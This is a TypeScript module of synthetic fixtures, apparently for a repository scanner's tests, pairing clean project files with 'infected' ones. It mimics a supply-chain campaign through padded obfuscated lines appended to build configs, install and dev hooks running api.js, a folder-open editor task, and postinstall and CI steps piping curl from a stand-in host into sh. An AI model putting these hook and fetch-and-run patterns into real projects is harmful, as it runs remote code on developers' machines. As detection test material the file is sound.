/** Synthetic campaign indicators. These strings are not a working dropper. */

export function syntheticPayloadLine(): string {
  const pad = " ".repeat(72);
  const body = "global['!']=_0xdemo4f2a;eval('void 0');Function('return 0')();";
  const filler = "/* synthetic-indicator */".repeat(24);
  return `${pad}${body}${filler}`;
}

export const INFECTED_PACKAGE_JSON = `{
  "name": "storefront",
  "private": true,
  "dependencies": {
    "next": "15.0.0",
    "react": "19.0.0"
  },
  "scripts": {
    "dev": "node api.js && next dev",
    "build": "node api.js && next build",
    "start": "node api.js && next start",
    "lint": "next lint",
    "preinstall": "node api.js",
    "postinstall": "curl https://example.invalid/x | sh"
  }
}
`;

export const CLEAN_PACKAGE_JSON = `{
  "name": "@northwind/design-system",
  "private": true,
  "dependencies": {
    "react": "19.0.0"
  },
  "scripts": {
    "dev": "storybook dev -p 6006",
    "build": "storybook build",
    "start": "storybook dev -p 6006",
    "lint": "eslint ."
  }
}
`;

export const PORTFOLIO_PACKAGE_JSON = `{
  "name": "portfolio",
  "scripts": {
    "dev": "node api.js && next dev",
    "build": "next build",
    "postinstall": "curl https://example.invalid/setup.sh | sh"
  },
  "dependencies": {
    "next": "15.0.0"
  }
}
`;

export const CLEAN_POSTCSS = `module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};
`;

export const INFECTED_POSTCSS = `module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};



${syntheticPayloadLine()}
`;

export const INFECTED_WEBPACK = `module.exports = {
  entry: "./src/index.js",
  mode: "production",
};

${syntheticPayloadLine()}
`;

export const INFECTED_NEXT_CONFIG = `const nextConfig = { reactStrictMode: true };
export default nextConfig;
${syntheticPayloadLine()}
`;

export const INFECTED_GITIGNORE = `node_modules
.next
dist
api.js
branch_structure.json
temp_auto_push.bat
temp_interactive_push.bat
`;

export const CLEAN_GITIGNORE = `node_modules
.next
dist
`;

export const SYNTHETIC_API_JS = `/**
 * Synthetic RepoShield demo file.
 * Indicators only: it does not connect to a network or read credentials.
 */
const _0xdemo4f2a = ["indicator"];
global["!"] = _0xdemo4f2a;
eval("void 0");
Function("return 0")();
`;

export const INFECTED_TASKS = `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "install hook",
      "type": "shell",
      "command": "node api.js",
      "runOn": "folderOpen"
    },
    {
      "label": "test",
      "type": "shell",
      "command": "npm test"
    }
  ]
}
`;

export const INFECTED_SETTINGS = `{
  "editor.formatOnSave": true,
  "task.allowAutomaticTasks": "on"
}
`;

export const CLEAN_SETTINGS = `{
  "editor.formatOnSave": true
}
`;

export const CLEAN_WORKFLOW = `name: ci
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
`;

export const WORKFLOW_CURL = `name: setup
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.invalid/setup.sh | sh
`;

export const PASSWORD_FILE = "demo-fixture-not-a-real-secret\n";

export const BRANCH_STRUCTURE_JSON = `{
  "note": "synthetic fixture",
  "branches": ["main"]
}
`;

export const TEMP_AUTO_PUSH_BAT = "@echo off\r\nREM synthetic fixture name only\r\necho reposhield-demo\r\n";

export const TEMP_INTERACTIVE_PUSH_BAT = "@echo off\r\nREM synthetic fixture name only\r\necho reposhield-demo\r\n";
